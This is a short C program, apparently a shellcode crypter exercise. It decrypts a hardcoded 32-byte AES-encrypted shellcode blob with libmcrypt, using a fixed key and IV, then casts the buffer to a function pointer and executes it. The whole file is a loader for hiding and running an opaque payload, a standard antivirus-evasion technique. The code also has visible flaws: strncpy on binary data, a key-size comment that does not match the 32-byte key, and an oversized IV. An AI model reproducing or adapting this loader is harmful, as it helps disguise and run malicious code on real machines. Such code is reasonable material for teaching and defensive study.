#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <mcrypt.h>
#include <math.h>
#include <stdint.h>
#include <stdlib.h>


int decrypt(
    void* buffer,
    int buffer_len,
    char* IV, 
    char* key,
    int key_len 
){
  MCRYPT td = mcrypt_module_open("rijndael-128", NULL, "cbc", NULL);
  int blocksize = mcrypt_enc_get_block_size(td);
  if( buffer_len % blocksize != 0 ){return 1;}
  
  mcrypt_generic_init(td, key, key_len, IV);
  mdecrypt_generic(td, buffer, buffer_len);
  mcrypt_generic_deinit (td);
  mcrypt_module_close(td);
  
  return 0;
}


int main()
{
  MCRYPT td, td2;
  char * crypted_sc = "\x27\x02\xb8\x1b\xcc\x83\x26\x55\xec\xbb\x06\x82\x33\xbc\x22\xcf\xaa\x35\xab\xd4\xcf\xb0\xed\x5c\x0a\x11\x30\x32\xe6\xeb\x71\x1f";
  char* IV = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
  char *key = "0123456789abcdef0123456789abcdef";
  int keysize = 32; /* 128 bits */
  char* buffer;
  int buffer_len = 32;

  buffer = calloc(1, buffer_len);
  strncpy(buffer, crypted_sc, buffer_len);
  decrypt(buffer, buffer_len, IV, key, keysize);
  
  //jump into SC
  int (*ret)() = (int(*)())buffer;
  ret();

  return 0;
}
